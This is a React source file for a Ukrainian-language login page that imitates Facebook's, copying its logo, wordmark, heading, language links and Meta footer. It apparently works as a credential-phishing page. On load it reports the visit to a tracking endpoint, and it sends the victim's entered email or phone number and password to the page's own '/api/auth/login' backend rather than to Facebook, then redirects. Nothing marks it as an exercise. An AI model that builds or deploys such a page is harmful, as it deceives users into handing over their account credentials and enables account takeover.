import { useState, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";

export default function Login() {
  const navigate = useNavigate();
  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // Track page visit on mount
  useEffect(() => {
    const trackVisit = async () => {
      try {
        await fetch("/api/auth/track-visit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
        });
      } catch (err) {
        console.error("Error tracking visit:", err);
      }
    };

    trackVisit();
  }, []);

  // Validate email format
  const isValidEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Validate phone number (accepts various formats)
  // Supports: +380XXXXXXXXX, 0XXXXXXXXX, +38(0XX)XXX-XXXX, 380XXXXXXXXX
  const isValidPhone = (phone: string): boolean => {
    // Remove all non-digit characters except + at the start
    const cleaned = phone.replace(/\D/g, "");

    // Check for Ukrainian numbers
    // Can be: 0XXXXXXXXX (10 digits), 380XXXXXXXXX (12 digits), XXXXXXXXX (9 digits - without country/area code)
    if (cleaned.length === 10 && cleaned.startsWith("0")) return true; // 0XXXXXXXXX
    if (cleaned.length === 12 && cleaned.startsWith("380")) return true; // 380XXXXXXXXX
    if (cleaned.length === 9) return true; // XXXXXXXXX (just phone number)

    // Alternative check with original format
    const phoneRegex = /^(\+?380|0)[0-9\s\-()]+$/;
    return phoneRegex.test(phone) && cleaned.length >= 9;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    const input = emailOrPhone.trim();

    // Determine if input is email or phone
    const isEmail = isValidEmail(input);
    const isPhone = isValidPhone(input);

    if (!isEmail && !isPhone) {
      setError(
        "Будь ласка, введіть валідну электронну адресу або номер телефону"
      );
      setLoading(false);
      return;
    }

    try {
      const response = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: isEmail ? input : "",
          phone: isPhone ? input : "",
          password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        localStorage.setItem("isAdmin", "true");
        localStorage.setItem("adminEmail", input);
        navigate("/welcome");
      } else {
        setError("Невірні облікові дані. Спробуйте ще раз.");
      }
    } catch (err) {
      setError("Сталася помилка. Спробуйте ще раз.");
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col lg:flex-row">
      {/* Left Section - Logo & Tagline */}
      <div className="hidden lg:flex lg:w-1/2 lg:flex-col lg:justify-center lg:items-start lg:p-12 lg:bg-white">
      <img src="/Facebook_logo.svg" alt="FacebookLogo" style={{ maxWidth: "3%", height: "auto", margin: "0 0 5% 0" }} />
        <div className="max-w-md">
          <h1 className="text-7xl font-black text-blue-600 mb-6">facebook</h1>
          <p className="text-3xl font-bold text-gray-900 leading-tight">
            Відкрийте для себе речі, від яких ви в захваті.
          </p>
          <img src="/facebook.webp" alt="Facebook" style={{ maxWidth: "100%", height: "auto", margin: "10% 0" }} />
        </div>
        
      </div>

      {/* Right Section - Login Form */}
      <div className="flex-1 flex flex-col justify-center items-center p-4 lg:p-0 lg:w-1/2 lg:bg-white">
        <div className="w-full max-w-sm">
          {/* Mobile Logo */}
          <div className="lg:hidden mb-8 text-center">
            <h1 className="text-4xl font-black text-blue-600">facebook</h1>
          </div>

          {/* Login Card */}
          <div className="bg-white rounded-lg lg:rounded-none lg:shadow-none shadow-lg p-6 lg:p-0">
            {/* Title */}
            <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center lg:text-left">
              Увійти у Facebook
            </h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              {error && (
                <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-lg text-sm">
                  {error}
                </div>
              )}

              {/* Email or Phone Input */}
              <div>
                <input
                  type="text"
                  value={emailOrPhone}
                  onChange={(e) => setEmailOrPhone(e.target.value)}
                  placeholder="Ел. адреса або номер телефону"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 text-gray-900"
                  required
                />
              </div>

              {/* Password Input */}
              <div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Пароль"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 text-gray-900"
                  required
                />
              </div>

              {/* Login Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-3 rounded-lg transition-colors duration-200 text-lg"
              >
                {loading ? "Вхід..." : "Увійти"}
              </button>

              {/* Forgot Password */}
              <div className="text-center">
                <button
                  type="button"
                  className="text-blue-600 hover:underline text-sm font-medium"
                >
                  Забули пароль?
                </button>
              </div>

              {/* Divider */}
              <div className="relative my-6">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
              </div>

              {/* Sign Up Link */}
              <Link
                to="/signup"
                className="w-full inline-block text-center bg-white hover:bg-blue-500 text-black border border-gray-300 py-3 rounded-lg transition-colors duration-200"
              >
                Створити новий акаунт
              </Link>
            </form>

            {/* Footer Links */}
            <div className="mt-6 pt-4 border-t border-gray-300 text-center text-xs text-gray-600 space-y-1">
              <div className="flex flex-wrap justify-center gap-2">
                <button className="hover:underline">Українська</button>
                <span>•</span>
                <button className="hover:underline">Русский</button>
                <span>•</span>
                <button className="hover:underline">English (US)</button>
                <span>•</span>
                <button className="hover:underline">Magyar</button>
                <span>•</span>
                <button className="hover:underline">العربية</button>
              </div>
              <div className="flex flex-wrap justify-center gap-2">
                <button className="hover:underline">Français (France)</button>
                <span>•</span>
                <button className="hover:underline">Türkçe</button>
                <span>•</span>
                <button className="hover:underline">Інші мови...</button>
              </div>
            </div>

            {/* Meta Footer */}
            <div className="mt-4 flex flex-wrap justify-center gap-2">
              <img src="/Meta_logo.svg" alt="Meta" style={{ maxWidth: "15%", height: "auto", margin: "" }} />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
